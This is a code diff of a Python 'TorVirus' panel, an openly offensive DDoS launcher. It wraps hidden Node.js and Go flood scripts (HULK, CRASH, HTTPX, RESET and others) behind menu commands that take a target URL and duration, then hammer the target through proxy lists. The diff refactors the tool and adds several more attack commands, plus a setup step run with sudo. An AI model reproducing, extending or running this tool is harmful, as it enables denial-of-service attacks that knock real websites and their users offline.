@@ -1,51 +1,60 @@
-import os, time, sys, random
-def progress(curr, total, bl=30):
-    filled = int(bl * curr // total)
-    bar = '█' * filled + '-' * (bl - filled)
-    return f"[{bar}] {curr}/{total}"
+import os as o, time as t, sys as s, random as r
 
-def clear():
-    os.system('cls' if os.name == 'nt' else 'clear')
+# Display a progress bar
+def progress(current, total, bar_length=30):
+    filled_length = int(bar_length * current // total)
+    bar = '█' * filled_length + '-' * (bar_length - filled_length)
+    return f"[{bar}] {current}/{total}"
 
-def load_proxies(fp='proxy.txt'):
+# Clear the console
+def clear_console():
+    o.system('cls' if o.name == 'nt' else 'clear')
+
+# Load proxies from a file
+def load_proxies(file_path='proxy.txt'):
     try:
-        with open(fp, 'r') as f:
-            for line in f:
-                p = line.strip()
-                if p:
-                    yield p
+        with open(file_path, 'r') as file:
+            for line in file:
+                proxy = line.strip()
+                if proxy:
+                    yield proxy
     except FileNotFoundError:
-        print(f"⚠️  Error: {fp} not found. Proxy connection aborted.")
-        sys.exit(1)
+        print(f"⚠️  Error: {file_path} not found. Proxy connection aborted.")
+        s.exit(1)
 
-def display_stats():
-    uptime = int(time.time() - session_start)
-    mins, secs = divmod(uptime, 60)
+# Display dashboard with system stats
+def display_dashboard():
+    uptime_seconds = int(t.time() - session_start)
+    minutes, seconds = divmod(uptime_seconds, 60)
     print(f'''
-    🖥️ TorVirus DASHBOARD 🖥️
-    | 🛰️ Bots Online: {bc}
-    | ⏳ Uptime: {mins}m {secs}s
-    | 📈 Success Rate: {random.randint(85, 99)}%
-    | 🔗 Network Strength: {random.choice(["Strong", "Moderate", "Weak"])}
-    | ⚠️ Threat Level: {random.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
+    🖥️  TorVirus DASHBOARD 🖥️
+    | 🛰️  Bots Online: {bot_count}
+    | ⏳ Uptime: {minutes}m {seconds}s
+    | 📈 Success Rate: {r.randint(85, 99)}%
+    | 🔗 Network Strength: {r.choice(["Strong", "Moderate", "Weak"])}
+    | ⚠️  Threat Level: {r.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
     ''')
 
-def matrix_fall(d=3):
-    start = time.time()
-    while time.time() - start < d:
-        print(''.join(random.choice('01 ') for _ in range(80)))
-        time.sleep(0.1)
+# Matrix-style loading effect
+def matrix_effect(duration=3):
+    start = t.time()
+    while t.time() - start < duration:
+        print(''.join(r.choice('01 ') for _ in range(80)))
+        t.sleep(0.1)
 
-def welcome_msg(bc, st):
-    top_msg = "🚨 WELCOME TO TORVIRUS 🚨"
-    proxy_info = f"| 🔐 Zombies: {bc} | Session: {st:.2f}s | 🌐 Tor✅"
-    clear()
-    matrix_fall(2)
-    clear()
+# Welcome message with animations
+def welcome_message(bot_count, session_time):
+    title = "🚨 WELCOME TO TORVIRUS 🚨"
+    info = f"| 🔐 Zombies: {bot_count} | Session: {session_time:.2f}s | 🌐 Tor✅"
+    clear_console()
+    matrix_effect(2)
+    clear_console()
+    print(f"{title}\n{info}\n")
 
+# Show main menu
 def display_menu():
-    clear()
-    welcome_msg(bc, session_time())
+    clear_console()
+    welcome_message(bot_count, session_duration())
     print('''  
   _____      __   ___
  |_   _|__ _ \ \ / (_)_ _ _  _ ___
@@ -56,96 +65,182 @@ def display_menu():
          (Top-secret Protocols)
 
     !TOR     - Launch TOR-based DDoS
-      TOR https://example.com 120
+      Usage: TOR https://example.com 60
 ''')
 
-def load_anim(text, dur=1.5):
+# Loading animation
+def loading_animation(task, duration=1.5):
     frames = ['◐', '◓', '◑', '◒']
-    start = time.time()
-    i = 0
-    while time.time() - start < dur:
-        print(f'\r{text} {frames[i % len(frames)]}', end='', flush=True)
-        time.sleep(0.15)
-        i += 1
+    start = t.time()
+    index = 0
+    while t.time() - start < duration:
+        print(f'\r{task} {frames[index % len(frames)]}', end='', flush=True)
+        t.sleep(0.15)
+        index += 1
     print('\r', end='')
 
-def anim_text(txt, delay=0.05, end_line=True):
-    for char in txt:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
+# Typing effect for cool text output
+def animated_text(text, delay=0.05, end_line=True):
+    for char in text:
+        s.stdout.write(char)
+        s.stdout.flush()
+        t.sleep(delay)
     if end_line:
         print()
 
-def rand_cool_text():
-    texts = [
+# Random task text
+def random_task_text():
+    messages = [
         "🌐 Establishing Encrypted TOR Network Tunnels...",
         "🌀 Tuning Low-Latency High-Speed Proxies...",
     ]
-    r_txt = random.choice(texts)
-    load_anim("Processing", 1.5)
-    anim_text(r_txt)
+    selected_text = r.choice(messages)
+    loading_animation("Processing", 1.5)
+    animated_text(selected_text)
 
-def session_time():
-    return time.time() - session_start
+# Session duration calculation
+def session_duration():
+    return t.time() - session_start
 
+# Main loop to handle commands
 def main_loop():
     display_menu()
     while True:
         user_input = input("root@torvirus#~ ").strip()
         if not user_input:
             continue
-        cmd_parts = user_input.split()
-        cmd = cmd_parts[0].upper()
-        if cmd == "STATS":
-            clear()
-            display_stats()
+        parts = user_input.split()
+        command = parts[0].upper()
+        
+        if command == "STATS":
+            clear_console()
+            display_dashboard()
             continue
-        elif cmd in ["CLEAR", "CLS"]:
-            load_anim("Purging Console", 1.5)
+        elif command in ["CLEAR", "CLS"]:
+            loading_animation("Purging Console", 1.5)
             display_menu()
-        elif cmd == "TOR":
+        elif command == "TOR":
             try:
-                host = cmd_parts[1]
-                total_time = int(cmd_parts[2])
-                attack_time = 120
-                start_time = time.time()
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
 
-                anim_text(f"Engaging Attack on {host} for {total_time} seconds... 💥", 0.05)
+                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
-                while time.time() - start_time < total_time:
-                    os.system(f'node .TorCache/.TorOdd/TOR.js GET "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
-                    os.system(f'node .TorCache/.TorOdd/TOR.js POST "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
-                    os.system(f'node .TorCache/.TorOdd/BYPASS.js {host} {attack_time} 32 50 proxy.txt')
-                    os.system(f'go run .TorCache/.TorOdd/HULK.go --site {host} --data GET')
-                    os.system(f'go run .TorCache/.TorOdd/CRASH.go {host} 9999 get {attack_time} nil')
-                    os.system(f'node .TorCache/.TorOdd/DARK.js GET {host} {attack_time} 32 50 proxy.txt')
-
-                    time.sleep(1)
+                while t.time() - start_time < time:
+                    o.system(f'node .TorCache/.TorOdd/TOR.js GET "{host}" {max_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    o.system(f'node .TorCache/.TorOdd/TOR.js POST "{host}" {max_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    t.sleep(1)
 
             except IndexError:
                 print('❌ Invalid Command. Usage: METHOD URL TIME')
-                print('Example: TOR https://example.com 120')
+                print('Example: TOR https://example.com 60')
 
-        elif cmd == "HELP":
-            load_anim("Loading Help Interface", 1.5)
+        elif command == "FLOOD":
+            try:
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
+
+                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
+
+                while t.time() - start_time < time:
+                    o.system(f'go run .TorCache/.TorOdd/HULK.go --site {host} --data GET')
+                    o.system(f'go run .TorCache/.TorOdd/CRASH.go {host} 9999 get {max_time} nil')
+                    t.sleep(1)
+
+            except IndexError:
+                print('❌ Invalid Command. Usage: METHOD URL TIME')
+                print('Example: TOR https://example.com 60')
+
+        elif command == "HTTPX":
+            try:
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
+
+                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
+
+                while t.time() - start_time < time:
+                    o.system(f'node .TorCache/.TorOdd/HTTPX.js {host} {max_time} 8 8 proxy.txt')
+                    o.system(f'node .TorCache/.TorOdd/HTTPZ.js {host} {max_time} 8 8 proxy.txt')
+                    t.sleep(1)
+
+            except IndexError:
+                print('❌ Invalid Command. Usage: METHOD URL TIME')
+                print('Example: TOR https://example.com 60')
+
+        elif command == "HTTPS":
+            try:
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
+
+                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
+
+                while t.time() - start_time < time:
+                    o.system(f'node .TorCache/.TorOdd/HTTPS.js POST {host} {max_time} 8 8 proxy.txt')
+                    o.system(f'node .TorCache/.TorOdd/HTPPSV2.js GET {host} {max_time} 8 8 proxy.txt')
+
+                    t.sleep(1)
+
+            except IndexError:
+                print('❌ Invalid Command. Usage: METHOD URL TIME')
+                print('Example: TOR https://example.com 60')
+
+        elif command == "RESET":
+            try:
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
+
+                animated_text(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
+
+                while t.time() - start_time < time:
+                    o.system(f'node .TorCache/.TorOdd/RESETV2.js {host} {max_time} 8 8 proxy.txt --full')
+                    o.system(f'node .TorCache/.TorOdd/RESET.js {host} {max_time} 8 8 proxy.txt')
+                    t.sleep(1)
+
+            except IndexError:
+                print('❌ Invalid Command. Usage: METHOD URL TIME')
+                print('Example: TOR https://example.com 60')
+
+        elif command == "PROXY":
+            o.system('python3 .TorCache/.TorOdd/proxy.py &')
+            continue
+
+        elif command == "SETUP":
+            o.system('sudo bash setup.sh &')
+            continue
+
+        elif command == "HELP":
+            loading_animation("Loading Help Interface", 1.5)
             print('''
 HELP - For Assistance
 CLEAR - Clear Terminal
 ''')
+
         else:
-            print(f"❌ Command [ {cmd} ] not recognized. Please try again! 🚨")
+            print(f"❌ Command [ {command} ] not recognized. Please try again! 🚨")
 
-def connect():
-    anim_text("🔌 Connecting to the TorVirus Network...", 0.02)
-    os.system('python3 .TorCache/.TorOdd/proxy.py &')
-    rand_cool_text()
+# Connection initiation
+def connect_network():
+    animated_text("🔌 Connecting to the TorVirus Network...", 0.02)
+    random_task_text()
 
-session_start = time.time()
+# Initialize session start time and proxy data
+session_start = t.time()
 proxies = list(load_proxies())
-bc = len(proxies)
-clear()
-connect()
+bot_count = len(proxies)
+
+# Run the application
+clear_console()
+connect_network()
 try:
     main_loop()
 finally:
